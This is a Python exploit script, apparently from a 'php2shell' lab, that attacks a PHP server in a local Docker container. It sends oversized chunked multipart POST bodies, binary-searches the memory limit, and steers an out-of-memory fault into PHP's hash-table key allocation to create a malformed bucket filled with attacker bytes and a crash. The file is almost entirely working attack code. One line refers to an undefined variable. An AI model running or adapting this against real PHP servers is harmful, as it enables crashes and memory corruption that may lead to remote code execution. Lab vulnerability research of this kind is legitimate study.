#!/usr/bin/env python3
"""php2shell lab, oom6: deterministic steering into the add_to_hash key alloc.

Stage 1 (probe): binary-search fill size F* = largest total-fill that parses
    without fatal. Parse sequence is deterministic per request shape, so F*
    is stable.
Stage 2 (strike): fill to F* - GAP with plain values, then append KEYRUN parts
    whose names are LONGKEY_KB of 0x08 with tiny values. The only remaining
    allocations of size > value-tiny are the key zend_string_init calls inside
    _zend_hash_add_or_update_i (zend_hash.c:890) — after `ht->nNumUsed++`
    already committed the bucket. OOM there = malformed bucket whose slot
    bytes come from recycled 0x08-filled memory.

Fingerprint of success:  "tried to allocate" ~7000±64  (or <256: bucket/ht
resize inside the insert path). Then check error.log for the segfault.
"""

import socket
import subprocess
import sys
import time

HOST = "127.0.0.1"
BOUNDARY = "b" + "X" * 20
POISON = b"\x08"
UNIT = 128 * 1024          # probe unit value size (fresh-heap edge must sit < 1000 parts)
LONGKEY = 300              # key name bytes: header line must stay << FILLUNIT (5120)
KEYRUN = 3000              # key-part pool (max_input_vars caps usable at ~520)


def part(name: str, value: bytes) -> bytes:
    head = (
        f"--{BOUNDARY}\r\n"
        f'Content-Disposition: form-data; name="{name}"\r\n\r\n'
    ).encode()
    return head + value + b"\r\n"


def restart():
    """TRUE heap reset: graceful restart keeps dirty children. Container
    restart kills all workers -> every send sees a pristine heap."""
    subprocess.run(["docker", "restart", "php_vuln"], capture_output=True, timeout=60)
    time.sleep(1.5)


def send(port: int, parts: list[bytes]) -> tuple[bool, str]:
    body = b"".join(parts) + f"--{BOUNDARY}--\r\n".encode()
    s = socket.create_connection((HOST, port), timeout=240)
    s.sendall(
        (
            f"POST /index.php HTTP/1.1\r\nHost: {HOST}\r\n"
            f"Content-Type: multipart/form-data; boundary={BOUNDARY}\r\n"
            f"Transfer-Encoding: chunked\r\nConnection: close\r\n\r\n"
        ).encode()
    )
    for i in range(0, len(body), 65536):
        c = body[i:i + 65536]
        s.sendall(f"{len(c):x}\r\n".encode() + c + b"\r\n")
    s.sendall(b"0\r\n\r\n")
    resp = b""
    while True:
        try:
            d = s.recv(65536)
        except socket.timeout:
            break
        if not d:
            break
        resp += d
    s.close()
    text = resp.decode("utf-8", "replace")
    return ("Fatal error" in text), text


def fill_parts(n_units: int, rem: int = 0, keyrun: int = 0) -> list[bytes]:
    u = POISON * UNIT
    ps = [part(f"a[{i}]", u) for i in range(n_units)]
    if rem:
        ps.append(part("a[r]", POISON * rem))
    for k in range(keyrun):
        ps.append(part((POISON * LONGKEY).decode("latin1") + str(k), b"x"))
    return ps


def fatal_n(text: str):
    import re
    m = re.search(r"tried to allocate (\d+) bytes", text)
    return int(m.group(1)) if m else None


def main():
    import subprocess
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 8081
    log = lambda *a: print(*a, flush=True)

    # ---- stage 1: binary-search max n_units without fatal (restart before EVERY send).
    # Values are double-buffered (chunk filter + multipart buffer), so real usage
    # ~2x payload: safe n lands near ~480 for 128KB units. Search [200, 1000].
    a, b = 200, 1000
    lo = None
    while a <= b:
        mid = (a + b) // 2
        restart()
        fatal, _ = send(port, fill_parts(mid))
        log(f"probe n={mid}: fatal={fatal}")
        if fatal:
            b = mid - 1
        else:
            lo = mid
            a = mid + 1
    if lo is None:
        log("even 200 units fatal — units too big; abort")
        return
    hi = lo + 1
    log(f"safe units = {lo}")
    # refine units between lo (ok) and hi (fatal): coarse 50-step may skip; here unit
    # granularity is enough because we tune the remainder byte-precisely next.
    # ---- stage 1b: binary-search remainder r in [0, UNIT) at n = lo units
    a, b = 0, UNIT
    best_ok = 0
    while a <= b:
        mid = (a + b) // 2
        restart()
        fatal, _ = send(port, fill_parts(lo, rem=mid))
        log(f"probe rem={mid}: fatal={fatal}")
        if fatal:
            b = mid - 1
        else:
            best_ok = mid
            a = mid + 1
    log(f"max safe fill = {lo} units + rem {best_ok} ({best_ok/1024:.1f} KB)")

    # ---- stage 2: precision strike. 300B keys: param emalloc 316B + value zval
    # 32B are PRE-commit; the 328B key zend_string_init in add_to_hash is the
    # POST-commit alloc. 1-byte-stable calibration -> gap 650B: 650-348 = 302B
    # free at the first key alloc -> OOM inside add_to_hash.
    # Malformed bucket slot = recycled bytes = our 0x08 fill.
    # Final geometry: base fill (478 units + rem G under the edge) + key pool
    # 3000 (input_vars caps at ~520 usable = ~190KB net growth). Crossing must
    # land MID-KEY-RUN -> fingerprint alloc = 328 (the 300B key zend_string).
    # Small G sweep positions the crossing; G* run then proves the primitive.
    for g in (0, 4096, 8192, 16384, 32768, 65536):
        rem = best_ok - g
        if rem < 0:
            continue
        restart()
        fatal, text = send(port, fill_parts(lo, rem=rem, keyrun=KEYRUN))
        n_alloc = fatal_n(text) if fatal else None
        tag = ""
        if fatal and n_alloc is not None and n_alloc < LONGKEY + 128:
            tag = "  *** KEY/HASH-PATH CROSSING ***"
        log(f"strike G={g}B fatal={fatal} alloc={n_alloc}{tag}")
        if tag:
            log(star_text[:0] or text[:400])
            return


if __name__ == "__main__":
    main()
